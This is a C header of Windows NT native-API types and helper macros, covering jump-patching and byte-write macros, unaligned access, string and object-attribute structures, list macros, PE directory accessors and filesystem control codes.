#define MODIFYBYTE( _base, _offset, _byte ) { ((unsigned char *)_base)[_offset] = (unsigned char)_byte; }
#define MODIFYWORD( _base, _offset, _word ) { ((unsigned short *)_base)[_offset] = (unsigned short)_word; }
#define MODIFYDWORD( _base, _offset, _dword ) { ((unsigned long *)_base)[_offset] = (unsigned long)_dword; }
#define MODIFYQWORD( _base, _offset, _qword ) { ((unsigned long long *)_base)[_offset] = (unsigned long long)_qword; }

#define PTR_ADD_OFFSET(Pointer, Offset) ((PVOID)((ULONG_PTR)(Pointer) + (ULONG_PTR)(Offset)))

#define WRITE_JMP( from, to ) { ((PCHAR)from)[0] = (CHAR)0xE9; *((ULONG_PTR *)&(((PCHAR)(from))[1])) = (PCHAR)(to) - (PCHAR)(from) - 5; }
#define GET_JMP( from ) (((PCHAR)from)[0]==(CHAR)0xE9)? (*((ULONG_PTR *)&(((PCHAR)(from))[1])) + 5 + (ULONG_PTR)(from)) : 0

#define ASSERT( exp )	((void) 0)

//
// The following macros store and retrieve USHORTS and ULONGS from potentially unaligned addresses, avoiding alignment faults.
//

// 31.05.2011 - added the following macros
#define SHORT_SIZE		(sizeof(USHORT))
#define SHORT_MASK		(SHORT_SIZE - 1)
#define LONG_SIZE			(sizeof(LONG))
#define LONG_MASK			(LONG_SIZE - 1)
#define LOWBYTE_MASK	0x00FF

#define FIRSTBYTE(VALUE)  (VALUE & LOWBYTE_MASK)
#define SECONDBYTE(VALUE) ((VALUE >> 8) & LOWBYTE_MASK)
#define THIRDBYTE(VALUE)  ((VALUE >> 16) & LOWBYTE_MASK)
#define FOURTHBYTE(VALUE) ((VALUE >> 24) & LOWBYTE_MASK)

//
// if MIPS Big Endian, order of bytes is reversed.
//

#define SHORT_LEAST_SIGNIFICANT_BIT			0
#define SHORT_MOST_SIGNIFICANT_BIT			1

#define LONG_LEAST_SIGNIFICANT_BIT			0
#define LONG_3RD_MOST_SIGNIFICANT_BIT		1
#define LONG_2ND_MOST_SIGNIFICANT_BIT		2
#define LONG_MOST_SIGNIFICANT_BIT				3

//++
//
// VOID
// RtlStoreUshort (
//     PUSHORT ADDRESS
//     USHORT VALUE
//     )
//
// Routine Description:
//
// This macro stores a USHORT value in at a particular address, avoiding
// alignment faults.
//
// Arguments:
//
//     ADDRESS - where to store USHORT value
//     VALUE - USHORT to store
//
// Return Value:
//
//     none.
//
//--

#define RtlStoreUshort(ADDRESS,VALUE)                     \
         if ((ULONG_PTR)ADDRESS & SHORT_MASK) {               \
             ((PUCHAR) ADDRESS)[SHORT_LEAST_SIGNIFICANT_BIT] = (UCHAR)(FIRSTBYTE(VALUE));    \
             ((PUCHAR) ADDRESS)[SHORT_MOST_SIGNIFICANT_BIT ] = (UCHAR)(SECONDBYTE(VALUE));   \
         }                                                \
         else {                                           \
             *((PUSHORT) ADDRESS) = (USHORT) VALUE;       \
         }


//++
//
// VOID
// RtlStoreUlong (
//     PULONG ADDRESS
//     ULONG VALUE
//     )
//
// Routine Description:
//
// This macro stores a ULONG value in at a particular address, avoiding
// alignment faults.
//
// Arguments:
//
//     ADDRESS - where to store ULONG value
//     VALUE - ULONG to store
//
// Return Value:
//
//     none.
//
// Note:
//     Depending on the machine, we might want to call storeushort in the
//     unaligned case.
//
//--

#define RtlStoreUlong(ADDRESS,VALUE)                      \
         if ((ULONG_PTR)ADDRESS & LONG_MASK) {                \
             ((PUCHAR) ADDRESS)[LONG_LEAST_SIGNIFICANT_BIT      ] = (UCHAR)(FIRSTBYTE(VALUE));    \
             ((PUCHAR) ADDRESS)[LONG_3RD_MOST_SIGNIFICANT_BIT   ] = (UCHAR)(SECONDBYTE(VALUE));   \
             ((PUCHAR) ADDRESS)[LONG_2ND_MOST_SIGNIFICANT_BIT   ] = (UCHAR)(THIRDBYTE(VALUE));    \
             ((PUCHAR) ADDRESS)[LONG_MOST_SIGNIFICANT_BIT       ] = (UCHAR)(FOURTHBYTE(VALUE));   \
         }                                                \
         else {                                           \
             *((PULONG) ADDRESS) = (ULONG) VALUE;         \
         }

//++
//
// VOID
// RtlRetrieveUshort (
//     PUSHORT DESTINATION_ADDRESS
//     PUSHORT SOURCE_ADDRESS
//     )
//
// Routine Description:
//
// This macro retrieves a USHORT value from the SOURCE address, avoiding
// alignment faults.  The DESTINATION address is assumed to be aligned.
//
// Arguments:
//
//     DESTINATION_ADDRESS - where to store USHORT value
//     SOURCE_ADDRESS - where to retrieve USHORT value from
//
// Return Value:
//
//     none.
//
//--

#define RtlRetrieveUshort(DEST_ADDRESS,SRC_ADDRESS)                   \
         if ((ULONG_PTR)SRC_ADDRESS & SHORT_MASK) {                       \
             ((PUCHAR) DEST_ADDRESS)[0] = ((PUCHAR) SRC_ADDRESS)[0];  \
             ((PUCHAR) DEST_ADDRESS)[1] = ((PUCHAR) SRC_ADDRESS)[1];  \
         }                                                            \
         else {                                                       \
             *((PUSHORT) DEST_ADDRESS) = *((PUSHORT) SRC_ADDRESS);    \
         }                                                            \

//++
//
// VOID
// RtlRetrieveUlong (
//     PULONG DESTINATION_ADDRESS
//     PULONG SOURCE_ADDRESS
//     )
//
// Routine Description:
//
// This macro retrieves a ULONG value from the SOURCE address, avoiding
// alignment faults.  The DESTINATION address is assumed to be aligned.
//
// Arguments:
//
//     DESTINATION_ADDRESS - where to store ULONG value
//     SOURCE_ADDRESS - where to retrieve ULONG value from
//
// Return Value:
//
//     none.
//
// Note:
//     Depending on the machine, we might want to call retrieveushort in the
//     unaligned case.
//
//--

#define RtlRetrieveUlong(DEST_ADDRESS,SRC_ADDRESS)                    \
         if ((ULONG_PTR)SRC_ADDRESS & LONG_MASK) {                        \
             ((PUCHAR) DEST_ADDRESS)[0] = ((PUCHAR) SRC_ADDRESS)[0];  \
             ((PUCHAR) DEST_ADDRESS)[1] = ((PUCHAR) SRC_ADDRESS)[1];  \
             ((PUCHAR) DEST_ADDRESS)[2] = ((PUCHAR) SRC_ADDRESS)[2];  \
             ((PUCHAR) DEST_ADDRESS)[3] = ((PUCHAR) SRC_ADDRESS)[3];  \
         }                                                            \
         else {                                                       \
             *((PULONG) DEST_ADDRESS) = *((PULONG) SRC_ADDRESS);      \
         }

//++
//
// PCHAR
// RtlOffsetToPointer (
//     PVOID Base,
//     ULONG Offset
//     )
//
// Routine Description:
//
// This macro generates a pointer which points to the byte that is 'Offset'
// bytes beyond 'Base'. This is useful for referencing fields within
// self-relative data structures.
//
// Arguments:
//
//     Base - The address of the base of the structure.
//
//     Offset - An unsigned integer offset of the byte whose address is to
//         be generated.
//
// Return Value:
//
//     A PCHAR pointer to the byte that is 'Offset' bytes beyond 'Base'.
//
//
//--

#define RtlOffsetToPointer(B,O)  ((PCHAR)( ((PCHAR)(B)) + ((ULONG_PTR)(O))  ))


//++
//
// ULONG
// RtlPointerToOffset (
//     PVOID Base,
//     PVOID Pointer
//     )
//
// Routine Description:
//
// This macro calculates the offset from Base to Pointer.  This is useful
// for producing self-relative offsets for structures.
//
// Arguments:
//
//     Base - The address of the base of the structure.
//
//     Pointer - A pointer to a field, presumably within the structure
//         pointed to by Base.  This value must be larger than that specified
//         for Base.
//
// Return Value:
//
//     A ULONG offset from Base to Pointer.
//
//
//--

#define RtlPointerToOffset(B,P)  ((ULONG)( ((PCHAR)(P)) - ((PCHAR)(B))  ))
// 31.05.2011 - end

//
// Data Types -- DOT NOT modify -- modification will break 32bit & 64bit compatibly.
//

typedef char CCHAR;
typedef short CSHORT;
typedef CCHAR *PCCHAR;
typedef CSHORT *PCSHORT;
typedef ULONG CLONG;
typedef ULONG *PCLONG;

typedef ULONG LOGICAL;
typedef ULONG *PLOGICAL;

typedef LONG KPRIORITY;

typedef struct _STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PCHAR Buffer;
} STRING;
typedef STRING *PSTRING;

typedef STRING ANSI_STRING;
typedef PSTRING PANSI_STRING;

typedef STRING OEM_STRING;
typedef PSTRING POEM_STRING;
typedef CONST STRING* PCOEM_STRING;

typedef struct _CSTRING
{
	USHORT Length;
	USHORT MaximumLength;
	CONST char *Buffer;
} CSTRING;
typedef CSTRING *PCSTRING;
#define ANSI_NULL ((CHAR)0)

typedef STRING CANSI_STRING;
typedef PSTRING PCANSI_STRING;

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING, **PPUNICODE_STRING;
typedef const UNICODE_STRING *PCUNICODE_STRING;

typedef struct _STRING32
{
	USHORT Length;
	USHORT MaximumLength;
	ULONG Buffer;
} STRING32;
typedef STRING32 *PSTRING32;

typedef STRING32 UNICODE_STRING32;
typedef UNICODE_STRING32 *PUNICODE_STRING32;
#define UNICODE_NULL ((WCHAR)0)

typedef STRING32 ANSI_STRING32;
typedef ANSI_STRING32 *PANSI_STRING32;

typedef struct _STRING64
{
	USHORT Length;
	USHORT MaximumLength;
	ULONG_PTR	Buffer;
} STRING64;

typedef STRING64 *PSTRING64;

typedef STRING64 UNICODE_STRING64;
typedef UNICODE_STRING64 *PUNICODE_STRING64;

typedef STRING64 ANSI_STRING64;
typedef ANSI_STRING64 *PANSI_STRING64;

typedef USHORT RTL_ATOM;
typedef RTL_ATOM *PRTL_ATOM;

typedef UCHAR KIRQL;
typedef KIRQL *PKIRQL;

typedef CONST char *PCSZ;

typedef LARGE_INTEGER PHYSICAL_ADDRESS, *PPHYSICAL_ADDRESS;

#if !defined( _WINNT_ )

typedef struct _LIST_ENTRY {
   struct _LIST_ENTRY *Flink;
   struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;

#define FIELD_OFFSET(type, field)    ((LONG)&(((type *)0)->field))

#define CONTAINING_RECORD(address, type, field) ((type FAR *)( \
                                          (PCHAR)(address) - \
                                          (PCHAR)(&((type *)0)->field)))
#endif

typedef struct _TRIPLE_LIST_ENTRY
{
	struct _TRIPLE_LIST_ENTRY* Flink[ 3 ];
	struct _TRIPLE_LIST_ENTRY* Blink;
} TRIPLE_LIST_ENTRY, *PTRIPLE_LIST_ENTRY;

#define IN_REGION(x, Base, Size) (((ULONG)x >= (ULONG_PTR)Base) && ((ULONG)x <= (ULONG_PTR)Base + (ULONG)Size))

#ifndef RVATOVA
#define RVATOVA(base, offset) ((PVOID)((ULONG)base + (ULONG)(offset)))
#endif

#ifndef NOP_FUNCTION
#define NOP_FUNCTION (void)0
#endif
#define PAGED_CODE() NOP_FUNCTION;

#if defined(USE_LPC6432)
#define LPC_CLIENT_ID CLIENT_ID64
#define LPC_SIZE_T ULONGLONG
#define LPC_PVOID ULONGLONG
#define LPC_HANDLE ULONGLONG
#else
#define LPC_CLIENT_ID CLIENT_ID
#define LPC_SIZE_T SIZE_T
#define LPC_PVOID PVOID
#define LPC_HANDLE HANDLE
#endif

#define OBJ_INHERIT             0x00000002L
#define OBJ_HANDLE_TAGBITS			0x00000003L
#define OBJ_PERMANENT           0x00000010L
#define OBJ_EXCLUSIVE           0x00000020L
#define OBJ_CASE_INSENSITIVE    0x00000040L
#define OBJ_OPENIF              0x00000080L
#define OBJ_OPENLINK            0x00000100L
#define OBJ_KERNEL_HANDLE       0x00000200L
#define OBJ_FORCE_ACCESS_CHECK  0x00000400L
#define OBJ_VALID_ATTRIBUTES    0x000007F2L

#define RTL_QUERY_PROCESS_MODULES       0x00000001
#define RTL_QUERY_PROCESS_BACKTRACES    0x00000002
#define RTL_QUERY_PROCESS_HEAP_SUMMARY  0x00000004
#define RTL_QUERY_PROCESS_HEAP_TAGS     0x00000008
#define RTL_QUERY_PROCESS_HEAP_ENTRIES  0x00000010
#define RTL_QUERY_PROCESS_LOCKS         0x00000020
#define RTL_QUERY_PROCESS_MODULES32     0x00000040
#define RTL_QUERY_PROCESS_NONINVASIVE   0x80000000

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;        // SECURITY_DESCRIPTOR
	PVOID SecurityQualityOfService;  // SECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;
typedef CONST OBJECT_ATTRIBUTES *PCOBJECT_ATTRIBUTES;

#define InitializeObjectAttributes( p, n, a, r, s ) { \
	(p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
	(p)->RootDirectory = r;                             \
	(p)->Attributes = a;                                \
	(p)->ObjectName = n;                                \
	(p)->SecurityDescriptor = s;                        \
	(p)->SecurityQualityOfService = NULL;               \
}

//added 20.12.11
typedef struct _OBJECT_DIRECTORY_INFORMATION {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, *POBJECT_DIRECTORY_INFORMATION;

#if defined(_WINNT_) && (_MSC_VER < 1300) && !defined(___PROCESSOR_NUMBER_DEFINED)
#define ___PROCESSOR_NUMBER_DEFINED
typedef struct _PROCESSOR_NUMBER {
	WORD Group;
	BYTE Number;
	BYTE Reserved;
} PROCESSOR_NUMBER, *PPROCESSOR_NUMBER;
#endif

#if _WIN32_WINNT >= 0x0501

#define ANSI_NULL ((CHAR)0)     
#define UNICODE_NULL ((WCHAR)0) 

#ifndef UNICODE_STRING_MAX_BYTES
#define UNICODE_STRING_MAX_BYTES ((USHORT) 65534)
#endif

#define UNICODE_STRING_MAX_CHARS (32767)

#define DECLARE_CONST_UNICODE_STRING(_variablename, _string) \
	const WCHAR _variablename ## _buffer[] = _string; \
	const UNICODE_STRING _variablename = { sizeof(_string) - sizeof(WCHAR), sizeof(_string), (PWSTR) _variablename ## _buffer };

#endif // _WIN32_WINNT >= 0x0501

#define IsListEmpty(ListHead) \
	((ListHead)->Flink == (ListHead))

#define InitializeListHead(ListHead) (\
    (ListHead)->Flink = (ListHead)->Blink = (ListHead))

#define IsListEmpty(ListHead) \
    ((ListHead)->Flink == (ListHead))

#define RemoveHeadList(ListHead) \
    (ListHead)->Flink;\
    {RemoveEntryList((ListHead)->Flink)}

#define RemoveTailList(ListHead) \
    (ListHead)->Blink;\
    {RemoveEntryList((ListHead)->Blink)}

// VOID
// RemoveEntryList(
//     IN PLIST_ENTRY Entry
//     );
#define RemoveEntryList(Entry) {\
    PLIST_ENTRY _EX_Blink;\
    PLIST_ENTRY _EX_Flink;\
    _EX_Flink = (Entry)->Flink;\
    _EX_Blink = (Entry)->Blink;\
    _EX_Blink->Flink = _EX_Flink;\
    _EX_Flink->Blink = _EX_Blink;\
    }


// VOID
// InsertTailList(
//     IN PLIST_ENTRY ListHead,
//     IN PLIST_ENTRY Entry
//     );
#define InsertTailList(ListHead,Entry) {\
    PLIST_ENTRY _EX_Blink;\
    PLIST_ENTRY _EX_ListHead;\
    _EX_ListHead = (ListHead);\
    _EX_Blink = _EX_ListHead->Blink;\
    (Entry)->Flink = _EX_ListHead;\
    (Entry)->Blink = _EX_Blink;\
    _EX_Blink->Flink = (Entry);\
    _EX_ListHead->Blink = (Entry);\
    }

// VOID
// InsertHeadList(
//     IN PLIST_ENTRY ListHead,
//     IN PLIST_ENTRY Entry
//     );
#define InsertHeadList(ListHead,Entry) {\
    PLIST_ENTRY _EX_Flink;\
    PLIST_ENTRY _EX_ListHead;\
    _EX_ListHead = (ListHead);\
    _EX_Flink = _EX_ListHead->Flink;\
    (Entry)->Flink = _EX_Flink;\
    (Entry)->Blink = _EX_ListHead;\
    _EX_Flink->Blink = (Entry);\
    _EX_ListHead->Flink = (Entry);\
    }

// BOOL
// COUNT_IS_ALIGNED(
//     IN DWORD Count,
//     IN DWORD Pow2      // undefined if this isn't a power of 2.
//     );
//
#define COUNT_IS_ALIGNED(Count,Pow2) \
        ( ( ( (Count) & (((Pow2)-1)) ) == 0) ? TRUE : FALSE )

// BOOL
// POINTER_IS_ALIGNED(
//     IN LPVOID Ptr,
//     IN DWORD Pow2      // undefined if this isn't a power of 2.
//     );
//
#define POINTER_IS_ALIGNED(Ptr,Pow2) \
        ( ( ( ((DWORD)(Ptr)) & (((Pow2)-1)) ) == 0) ? TRUE : FALSE )


#define ROUND_DOWN_COUNT(Count,Pow2) \
        ( (Count) & (~((Pow2)-1)) )

#define ROUND_DOWN_POINTER(Ptr,Pow2) \
        ( (LPVOID) ROUND_DOWN_COUNT( ((DWORD)(Ptr)), (Pow2) ) )


// If Count is not already aligned, then
// round Count up to an even multiple of "Pow2".  "Pow2" must be a power of 2.
//
// DWORD
// ROUND_UP_COUNT(
//     IN DWORD Count,
//     IN DWORD Pow2
//     );
#define ROUND_UP_COUNT(Count,Pow2) \
        ( ((Count)+(Pow2)-1) & (~((Pow2)-1)) )

// LPVOID
// ROUND_UP_POINTER(
//     IN LPVOID Ptr,
//     IN DWORD Pow2
//     );

// If Ptr is not already aligned, then round it up until it is.
#define ROUND_UP_POINTER(Ptr,Pow2) \
        ( (LPVOID) ( (((DWORD)(Ptr))+(Pow2)-1) & (~((Pow2)-1)) ) )

#define ALIGN_BYTE					1
#define ALIGN_CHAR					1
#define ALIGN_DESC_CHAR			sizeof(DESC_CHAR)
#define ALIGN_DWORD					4
#define ALIGN_LONG					4
#define ALIGN_LPBYTE				4
#define ALIGN_LPDWORD				4
#define ALIGN_LPSTR					4
#define ALIGN_LPTSTR				4
#define ALIGN_LPVOID				4
#define ALIGN_LPWORD				4
#define ALIGN_TCHAR					sizeof(TCHAR)
#define ALIGN_WCHAR					sizeof(WCHAR)
#define ALIGN_WORD					2
#define ALIGN_QUAD					8

#define ALIGN_WORST					8

//03.06.2011 - added
#define QUAD_ALIGN(VALUE) ( ((ULONG)(VALUE) + 7) & ~7 )
//03.06.2011 - end

// Usage: myPtr = ROUND_UP_POINTER(unalignedPtr, ALIGN_DWORD);

// 31.05.2011 - added
#define EXPORT_VA(x)     ((x)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
#define IMPORT_VA(x)     ((x)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)
#define RELOC_VA(x)      ((x)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress)
#define RESOURCE_VA(x)   ((x)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress)

#define EXPORT_SIZE(x)   ((x)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size)
#define IMPORT_SIZE(x)   ((x)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size)
#define RELOC_SIZE(x)    ((x)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size)
#define RESOURCE_SIZE(x) ((x)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].Size)
#define DEBUGDIR_VA(x)   ((x)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress)
#define DEBUGDIR_SIZE(x) ((x)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].Size)
// 31.05.2011 - end

#define IS_VALID_HANDLE(hHandle) ((HANDLE)hHandle != (HANDLE)0 && (HANDLE)hHandle != (HANDLE)0xFFFFFFFF)
#define SIZEOF_ARRAY(arr) ( sizeof(arr) / sizeof(arr[0]) )
// 09.06.2011 - begin

//21.12.2011 added
#if !defined(_FILESYSTEMFSCTL_)
#define _FILESYSTEMFSCTL_

#define FSCTL_REQUEST_OPLOCK_LEVEL_1    CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  0, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_REQUEST_OPLOCK_LEVEL_2    CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  1, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_REQUEST_BATCH_OPLOCK      CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  2, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_OPLOCK_BREAK_ACKNOWLEDGE  CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  3, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_OPBATCH_ACK_CLOSE_PENDING CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  4, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_OPLOCK_BREAK_NOTIFY       CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  5, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_LOCK_VOLUME               CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  6, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_UNLOCK_VOLUME             CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  7, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_DISMOUNT_VOLUME           CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  8, METHOD_BUFFERED, FILE_ANY_ACCESS)
// decommissioned fsctl value                                              9
#define FSCTL_IS_VOLUME_MOUNTED         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 10, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_IS_PATHNAME_VALID         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 11, METHOD_BUFFERED, FILE_ANY_ACCESS) // PATHNAME_BUFFER,
#define FSCTL_MARK_VOLUME_DIRTY         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 12, METHOD_BUFFERED, FILE_ANY_ACCESS)
// decommissioned fsctl value                                             13
#define FSCTL_QUERY_RETRIEVAL_POINTERS  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 14,  METHOD_NEITHER, FILE_ANY_ACCESS)
#define FSCTL_GET_COMPRESSION           CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 15, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_SET_COMPRESSION           CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 16, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)
// decommissioned fsctl value                                             17
// decommissioned fsctl value                                             18
#define FSCTL_SET_BOOTLOADER_ACCESSED   CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 19,  METHOD_NEITHER, FILE_ANY_ACCESS)
#define FSCTL_OPLOCK_BREAK_ACK_NO_2     CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 20, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_INVALIDATE_VOLUMES        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 21, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_QUERY_FAT_BPB             CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 22, METHOD_BUFFERED, FILE_ANY_ACCESS) // FSCTL_QUERY_FAT_BPB_BUFFER
#define FSCTL_REQUEST_FILTER_OPLOCK     CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 23, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_FILESYSTEM_GET_STATISTICS CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 24, METHOD_BUFFERED, FILE_ANY_ACCESS) // FILESYSTEM_STATISTICS

#if (_WIN32_WINNT >= 0x0400)
#define FSCTL_GET_NTFS_VOLUME_DATA      CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 25, METHOD_BUFFERED, FILE_ANY_ACCESS) // NTFS_VOLUME_DATA_BUFFER
#define FSCTL_GET_NTFS_FILE_RECORD      CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 26, METHOD_BUFFERED, FILE_ANY_ACCESS) // NTFS_FILE_RECORD_INPUT_BUFFER, NTFS_FILE_RECORD_OUTPUT_BUFFER
#define FSCTL_GET_VOLUME_BITMAP         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 27,  METHOD_NEITHER, FILE_ANY_ACCESS) // STARTING_LCN_INPUT_BUFFER, VOLUME_BITMAP_BUFFER
#define FSCTL_GET_RETRIEVAL_POINTERS    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 28,  METHOD_NEITHER, FILE_ANY_ACCESS) // STARTING_VCN_INPUT_BUFFER, RETRIEVAL_POINTERS_BUFFER
#define FSCTL_MOVE_FILE                 CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 29, METHOD_BUFFERED, FILE_SPECIAL_ACCESS) // MOVE_FILE_DATA,
#define FSCTL_IS_VOLUME_DIRTY           CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 30, METHOD_BUFFERED, FILE_ANY_ACCESS)
// decomissioned fsctl value                                              31
#define FSCTL_ALLOW_EXTENDED_DASD_IO    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 32, METHOD_NEITHER,  FILE_ANY_ACCESS)
#endif /* _WIN32_WINNT >= 0x0400 */

#if (_WIN32_WINNT >= 0x0500)
// decommissioned fsctl value                                             33
// decommissioned fsctl value                                             34
#define FSCTL_FIND_FILES_BY_SID         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 35, METHOD_NEITHER, FILE_ANY_ACCESS)
// decommissioned fsctl value                                             36
// decommissioned fsctl value                                             37
#define FSCTL_SET_OBJECT_ID             CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 38, METHOD_BUFFERED, FILE_SPECIAL_ACCESS) // FILE_OBJECTID_BUFFER
#define FSCTL_GET_OBJECT_ID             CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 39, METHOD_BUFFERED, FILE_ANY_ACCESS) // FILE_OBJECTID_BUFFER
#define FSCTL_DELETE_OBJECT_ID          CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 40, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define FSCTL_SET_REPARSE_POINT         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 41, METHOD_BUFFERED, FILE_SPECIAL_ACCESS) // REPARSE_DATA_BUFFER,
#define FSCTL_GET_REPARSE_POINT         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 42, METHOD_BUFFERED, FILE_ANY_ACCESS) // REPARSE_DATA_BUFFER
#define FSCTL_DELETE_REPARSE_POINT      CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 43, METHOD_BUFFERED, FILE_SPECIAL_ACCESS) // REPARSE_DATA_BUFFER,
#define FSCTL_ENUM_USN_DATA             CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 44,  METHOD_NEITHER, FILE_ANY_ACCESS) // MFT_ENUM_DATA,
#define FSCTL_SECURITY_ID_CHECK         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 45,  METHOD_NEITHER, FILE_READ_DATA)  // BULK_SECURITY_TEST_DATA,
#define FSCTL_READ_USN_JOURNAL          CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 46,  METHOD_NEITHER, FILE_ANY_ACCESS) // READ_USN_JOURNAL_DATA, USN
#define FSCTL_SET_OBJECT_ID_EXTENDED    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 47, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define FSCTL_CREATE_OR_GET_OBJECT_ID   CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 48, METHOD_BUFFERED, FILE_ANY_ACCESS) // FILE_OBJECTID_BUFFER
#define FSCTL_SET_SPARSE                CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 49, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define FSCTL_SET_ZERO_DATA             CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 50, METHOD_BUFFERED, FILE_WRITE_DATA) // FILE_ZERO_DATA_INFORMATION,
#define FSCTL_QUERY_ALLOCATED_RANGES    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 51,  METHOD_NEITHER, FILE_READ_DATA)  // FILE_ALLOCATED_RANGE_BUFFER, FILE_ALLOCATED_RANGE_BUFFER
#define FSCTL_ENABLE_UPGRADE            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 52, METHOD_BUFFERED, FILE_WRITE_DATA)
// decommissioned fsctl value                                             52
#define FSCTL_SET_ENCRYPTION            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 53,  METHOD_NEITHER, FILE_ANY_ACCESS) // ENCRYPTION_BUFFER, DECRYPTION_STATUS_BUFFER
#define FSCTL_ENCRYPTION_FSCTL_IO       CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 54,  METHOD_NEITHER, FILE_ANY_ACCESS)
#define FSCTL_WRITE_RAW_ENCRYPTED       CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 55,  METHOD_NEITHER, FILE_SPECIAL_ACCESS) // ENCRYPTED_DATA_INFO, EXTENDED_ENCRYPTED_DATA_INFO
#define FSCTL_READ_RAW_ENCRYPTED        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 56,  METHOD_NEITHER, FILE_SPECIAL_ACCESS) // REQUEST_RAW_ENCRYPTED_DATA, ENCRYPTED_DATA_INFO, EXTENDED_ENCRYPTED_DATA_INFO
#define FSCTL_CREATE_USN_JOURNAL        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 57,  METHOD_NEITHER, FILE_ANY_ACCESS) // CREATE_USN_JOURNAL_DATA,
#define FSCTL_READ_FILE_USN_DATA        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 58,  METHOD_NEITHER, FILE_ANY_ACCESS) // Read the Usn Record for a file
#define FSCTL_WRITE_USN_CLOSE_RECORD    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 59,  METHOD_NEITHER, FILE_ANY_ACCESS) // Generate Close Usn Record
